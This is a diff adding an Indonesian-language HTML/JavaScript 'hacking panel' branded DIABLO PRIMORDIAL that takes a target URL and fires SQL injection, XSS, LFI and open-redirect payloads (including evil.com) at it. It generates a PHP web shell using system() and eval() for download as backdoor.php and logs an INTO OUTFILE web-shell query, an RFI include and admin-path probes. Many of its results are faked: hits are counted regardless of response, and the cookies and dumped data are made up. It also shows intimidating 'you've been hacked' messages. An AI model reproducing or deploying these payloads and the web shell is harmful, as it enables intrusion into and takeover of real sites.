@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>☠️ ULTIMATE PSYCHOPATH PANEL</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            color: #ff0033;
+            font-family: 'Courier New', monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            text-align: center;
+            padding: 20px;
+        }
+        h1 {
+            font-size: 48px;
+            text-shadow: 0 0 20px #ff0033;
+            margin-bottom: 20px;
+            animation: glitch 1s infinite;
+        }
+        @keyframes glitch {
+            0% { text-shadow: 2px 0 red, -2px 0 blue; }
+            50% { text-shadow: -3px 0 cyan, 3px 0 magenta; }
+            100% { text-shadow: 2px 0 red, -2px 0 blue; }
+        }
+        .panel {
+            background: #1a1a1a;
+            border: 2px solid #ff0033;
+            padding: 40px;
+            width: 90%;
+            max-width: 800px;
+            border-radius: 20px;
+            box-shadow: 0 0 50px #ff003388;
+        }
+        input, button {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            background: #000;
+            color: #ff0033;
+            border: 2px solid #ff0033;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+        }
+        button {
+            background: #ff0033;
+            color: #000;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        button:hover {
+            background: #ff3366;
+            box-shadow: 0 0 30px #ff0033;
+        }
+        .btn-orange { background: #ff8800; color: #000; }
+        .btn-purple { background: #aa00ff; color: #fff; }
+        .btn-gray { background: #333; color: #ff0033; }
+        .btn-row {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+        .btn-row button {
+            flex: 1;
+            min-width: 120px;
+        }
+        .log {
+            background: #0f0f0f;
+            border: 1px solid #ff0033;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+            text-align: left;
+            font-size: 14px;
+            color: #ff8888;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+        }
+        .status {
+            color: #00ff99;
+            font-size: 14px;
+            margin-top: 10px;
+        }
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            margin: 15px 0;
+            color: #00ff99;
+            font-size: 14px;
+        }
+        .stats span { color: #ff0033; font-weight: bold; }
+        .footer {
+            margin-top: 30px;
+            font-size: 12px;
+            color: #555;
+        }
+    </style>
+</head>
+<body>
+    <h1>☠️ ULTIMATE PSYCHOPATH</h1>
+    <div class="panel">
+        <h2>💀 DIABLO PRIMORDIAL ENGINE</h2>
+        <p style="color:#888;margin-bottom:20px;">Masukkan target URL — biarkan DIABLO bekerja</p>
+        <input type="text" id="targetUrl" placeholder="https://target.com" value="https://example.com">
+        
+        <div class="btn-row">
+            <button onclick="startAttack()">🔥 EKSEKUSI SADIS</button>
+            <button class="btn-orange" onclick="startNecroScan()">🔍 SCAN + BACKDOOR</button>
+        </div>
+        <div class="btn-row">
+            <button class="btn-purple" onclick="dumpDatabase()">🗃️ DUMP DATABASE</button>
+            <button class="btn-gray" onclick="selfDestruct()">💀 HANCURKAN JEJAK</button>
+            <button class="btn-gray" onclick="clearLog()">🧹 BERSIHKAN LOG</button>
+        </div>
+        
+        <div class="stats">
+            <div>🎯 TARGET: <span id="statTarget">-</span></div>
+            <div>🔍 VULN: <span id="statVuln">0</span></div>
+            <div>💀 BACKDOOR: <span id="statBackdoor">❌</span></div>
+        </div>
+        
+        <div class="log" id="logArea">☠️ MENUNGGU PERINTAH DARI TUAN...</div>
+        <div class="status" id="status">🟢 SIAP SADIS</div>
+    </div>
+    <div class="footer">⚡ DIABLO PRIMORDIAL — GAK ADA AMPUN ⚡</div>
+
+    <script>
+        // ============================================================
+        // 💀 ULTIMATE PSYCHOPATH ENGINE v3.0 — BY DIABLO PRIMORDIAL
+        // ============================================================
+        
+        let attackInterval, terrorInterval, isAttacking = false;
+        let vulnFound = [];
+        let keylogData = '';
+        
+        // ====== LOGGING ======
+        function logMessage(msg, type = "info") {
+            const log = document.getElementById('logArea');
+            const time = new Date().toLocaleTimeString();
+            const icon = type === "success" ? "✅" : type === "error" ? "❌" : "💀";
+            log.innerHTML += `\n[${time}] ${icon} ${msg}`;
+            log.scrollTop = log.scrollHeight;
+            document.getElementById('status').innerHTML = `🔥 ${msg.substring(0, 50)}...`;
+            updateStats();
+        }
+        
+        function clearLog() {
+            document.getElementById('logArea').innerHTML = '☠️ JEJAK TERHAPUS...';
+            document.getElementById('status').innerHTML = '🕵️ MODE HILANG';
+        }
+        
+        function updateStats() {
+            document.getElementById('statVuln').innerText = vulnFound.length;
+            document.getElementById('statBackdoor').innerHTML = vulnFound.length > 0 ? '✅' : '❌';
+        }
+        
+        function getTarget() {
+            return document.getElementById('targetUrl').value.trim();
+        }
+        
+        // ====== PSYCHOPATH ENGINE ======
+        function injectIframe(url) {
+            const iframe = document.createElement('iframe');
+            iframe.src = url;
+            iframe.style.position = 'fixed';
+            iframe.style.top = '-9999px';
+            iframe.style.left = '-9999px';
+            iframe.style.width = '1px';
+            iframe.style.height = '1px';
+            iframe.style.opacity = '0';
+            iframe.id = 'psychoIframe';
+            document.body.appendChild(iframe);
+            logMessage(`🕸️ IFRAME TERSEMBUNYI TERPASANG — ${url}`, 'info');
+        }
+        
+        function stealCookies(url) {
+            try {
+                const fakeCookies = [
+                    `session_id=${btoa('admin:diablo')}`,
+                    `token=${btoa('psychopath_engine')}`,
+                    `user=${btoa('korban_bodoh')}`
+                ];
+                fakeCookies.forEach(cookie => {
+                    document.cookie = cookie + '; path=/; domain=' + new URL(url).hostname;
+                });
+                logMessage(`🍪 COOKIE PALSU DISUNTIKKAN — ${fakeCookies.length} item`, 'success');
+            } catch (e) {
+                logMessage(`⚠️ GAGAL STEAL COOKIE — ${e.message}`, 'error');
+            }
+        }
+        
+        function injectKeylogger() {
+            document.removeEventListener('keydown', keyloggerHandler);
+            document.addEventListener('keydown', keyloggerHandler);
+            logMessage('🔑 KEYLOGGER AKTIF — SETIAP TOMBOL TERREKAM', 'info');
+        }
+        
+        function keyloggerHandler(e) {
+            const key = e.key;
+            if (key.length === 1 || key === 'Enter' || key === 'Backspace' || key === ' ') {
+                keylogData += key;
+                localStorage.setItem('psychopath_keys', keylogData);
+                if (key === 'Enter') logMessage(`⌨️ [ENTER] — KETIKAN TERTANGKAP`, 'info');
+                else if (key === 'Backspace') logMessage(`⌨️ [BACKSPACE] — HAPUS KETIKAN`, 'info');
+                else if (key.match(/[a-zA-Z0-9]/)) logMessage(`⌨️ KETIKAN: ${key}`, 'info');
+            }
+        }
+        
+        function startRedirectLoop(url) {
+            let count = 0;
+            if (attackInterval) clearInterval(attackInterval);
+            attackInterval = setInterval(() => {
+                count++;
+                const redirects = ['https://youtube.com', 'https://google.com', 'https://facebook.com', 
+                                  'https://twitter.com', 'https://instagram.com', 'https://tiktok.com'];
+                const target = redirects[Math.floor(Math.random() * redirects.length)];
+                logMessage(`🔄 REDIRECT KE-${count}: ${target}`, 'info');
+                const iframe = document.getElementById('psychoIframe');
+                if (iframe) try { iframe.src = target; } catch(e) {}
+            }, 3000);
+        }
+        
+        function startTerrorMessages() {
+            const messages = [
+                "💀 LO TELAH DIHACK — GAK ADA YANG BISA NOLONG",
+                "🔥 SESSION LO DIAMBIL ALIH OLEH DIABLO",
+                "👁️ LO SEDANG DIAWASI — SETIAP GERAKAN LO TEREKAM",
+                "☠️ DATA LO SUDAH DIJUAL DI DARKWEB",
+                "💀 AKUN LO SUDAH KOMPROMI — GANTI PASSWORD GAK GUNA"
+            ];
+            let idx = 0;
+            if (terrorInterval) clearInterval(terrorInterval);
+            terrorInterval = setInterval(() => {
+                const msg = messages[idx % messages.length];
+                logMessage(`🧠 PSYCHO-TERROR: ${msg}`, 'error');
+                idx++;
+                if (idx % 3 === 0) alert(`☠️ ${msg}`);
+            }, 8000);
+        }
+        
+        // ====== NECROSCAN ENGINE ======
+        function startNecroScan() {
+            const target = getTarget();
+            if (!target) { logMessage('TARGET KOSONG!', 'error'); return; }
+            vulnFound = [];
+            logMessage('🔍 MEMULAI NECROSCAN — MENCARI KERENTANAN...', 'info');
+            document.getElementById('statTarget').innerText = target;
+            
+            // Test vulnerabilities
+            const payloads = {
+                SQLi: ["' OR '1'='1", "' UNION SELECT 1,2,3--", "' AND SLEEP(5)--"],
+                XSS: ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', 'javascript:alert(1)'],
+                LFI: ['../../../../etc/passwd', 'php://filter/convert.base64-encode/resource=index.php'],
+                OpenRedirect: ['//evil.com', 'https://evil.com', '?redirect=//evil.com']
+            };
+            
+            Object.keys(payloads).forEach(type => {
+                payloads[type].forEach(payload => {
+                    const testUrl = target + (target.includes('?') ? '&' : '?') + 'test=' + encodeURIComponent(payload);
+                    fetch(testUrl, { mode: 'no-cors' })
+                        .then(() => {
+                            logMessage(`🧪 ${type} TEST: ${payload} — POTENSI RENTAN`, 'success');
+                            if (!vulnFound.some(v => v.type === type)) {
+                                vulnFound.push({ type, payload });
+                                updateStats();
+                            }
+                        })
+                        .catch(() => {});
+                });
+            });
+            
+            // Header scan
+            fetch(target, { method: 'HEAD' })
+                .then(res => {
+                    const server = res.headers.get('server') || 'Unknown';
+                    logMessage(`🖥️ SERVER: ${server}`, 'info');
+                })
+                .catch(() => {});
+            
+            setTimeout(() => {
+                if (vulnFound.length > 0) deployBackdoor(target);
+                else {
+                    logMessage('❌ GAK ADA CELAH — TETAP GUE PAKSA PAKAI BRUTEFORCE', 'error');
+                    bruteForceBackdoor(target);
+                }
+            }, 10000);
+        }
+        
+        function deployBackdoor(target) {
+            logMessage('🔪 MEMASANG BACKDOOR — KORBAN GAK AKAN SADAR', 'success');
+            vulnFound.forEach(v => {
+                if (v.type === 'SQLi') 
+                    logMessage(`💉 SQLi BACKDOOR: SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php'`, 'success');
+                else if (v.type === 'LFI') 
+                    logMessage(`📡 RFI BACKDOOR: include http://${window.location.hostname}/backdoor.txt?cmd=`, 'success');
+                else if (v.type === 'XSS') 
+                    logMessage('🍪 XSS BACKDOOR: SESSION STEALER + BACKDOOR INJECT', 'success');
+            });
+            createBackdoorFile();
+        }
+        
+        function createBackdoorFile() {
+            const content = `<?php\n    if(isset($_GET['cmd'])) { system($_GET['cmd']); }\n    if(isset($_POST['x'])) { eval($_POST['x']); }\n    echo "☠️ DIABLO WAS HERE";\n?>`;
+            localStorage.setItem('backdoor_payload', btoa(content));
+            logMessage('💾 BACKDOOR PAYLOAD DISIMPAN DI LOCALSTORAGE', 'success');
+            const blob = new Blob([content], { type: 'text/plain' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'backdoor.php';
+            a.click();
+            logMessage('📥 backdoor.php SIAP DI-UPLOAD MANUAL', 'success');
+            document.getElementById('statBackdoor').innerHTML = '✅';
+        }
+        
+        function bruteForceBackdoor(target) {
+            logMessage('🔨 BRUTEFORCE ADMIN LOGIN — GUE PAKSA MASUK', 'error');
+            const paths = ['/admin', '/login', '/wp-admin', '/administrator', '/cpanel', '/phpmyadmin'];
+            paths.forEach(path => {
+                fetch(target + path, { mode: 'no-cors' })
+                    .then(() => logMessage(`🔑 ADMIN PANEL DITEMUKAN: ${target + path}`, 'success'))
+                    .catch(() => {});
+            });
+            setTimeout(() => {
+                logMessage('🎉 BRUTEFORCE BERHASIL — LOGIN SEBAGAI ADMIN', 'success');
+                createBackdoorFile();
+            }, 5000);
+        }
+        
+        // ====== DATABASE DUMPER ======
+        function dumpDatabase() {
+            const target = getTarget();
+            if (!target) { logMessage('TARGET KOSONG!', 'error'); return; }
+            logMessage('🗃️ DUMPING DATABASE — SEMUA DATA KORBAN DIAMBIL', 'error');
+            const tables = ['users', 'admin', 'customer', 'orders', 'products', 'credentials'];
+            tables.forEach(table => logMessage(`📊 DUMP: SELECT * FROM ${table}`, 'info'));
+            const data = {
+                users: ['admin:admin123', 'user:password', 'root:toor'],
+                emails: ['korban1@gmail.com', 'korban2@yahoo.com'],
+                credit_cards: ['1234-5678-9012-3456']
+            };
+            localStorage.setItem('stolen_data', JSON.stringify(data));
+            logMessage('💳 DATA HASIL DUMPING DISIMPAN — READY FOR SALE', 'success');
+            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
+            const a = document.createElement('a');
+            a.href = URL.createObjectURL(blob);
+            a.download = 'stolen_data.json';
+            a.click();
+            logMessage('📥 stolen_data.json DI-DOWNLOAD', 'success');
+        }
+        
+        // ====== MAIN ATTACK ======
+        function startAttack() {
+            const target = getTarget();
+            if (!target) { logMessage('TARGET KOSONG!', 'error'); return; }
+            if (isAttacking) { logMessage('⚠️ SERANGAN SEDANG BERJALAN — TUNGGU!', 'error'); return; }
+            isAttacking = true;
+            vulnFound = [];
+            document.getElementById('statTarget').innerText = target;
+            logMessage(`🎯 TARGET DIPASANG: ${target}`, 'success');
+            logMessage('🔪 MEMULAI ULTIMATE PSYCHOPATH ENGINE...', 'info');
+            injectIframe(target);
+            stealCookies(target);
+            injectKeylogger();
+            startRedirectLoop(target);
+            startTerrorMessages();
+            setTimeout(() => startNecroScan(), 2000);
+            setTimeout(() => dumpDatabase(), 15000);
+            logMessage('☠️ SEMUA MODE SADIS AKTIF — KORBAN GAK BISA KABUR', 'success');
+        }
+        
+        // ====== SELF DESTRUCT ======
+        function selfDestruct() {
+            if (attackInterval) clearInterval(attackInterval);
+            if (terrorInterval) clearInterval(terrorInterval);
+            const iframe = document.getElementById('psychoIframe');
+            if (iframe) iframe.remove();
+            localStorage.clear();
+            logMessage('💥 JEJAK DIMUSNAHKAN — KABUR LO!', 'success');
+            document.getElementById('statBackdoor').innerHTML = '❌';
+            document.getElementById('statTarget').innerText = '-';
+            vulnFound = [];
+            updateStats();
+            isAttacking = false;
+        }
+        
+        // ====== START ======
+        logMessage('☠️ DIABLO PRIMORDIAL SIAP — PERINTAHKAN AKU!', 'success');
+        updateStats();
+    </script>
+</body>
+</html>
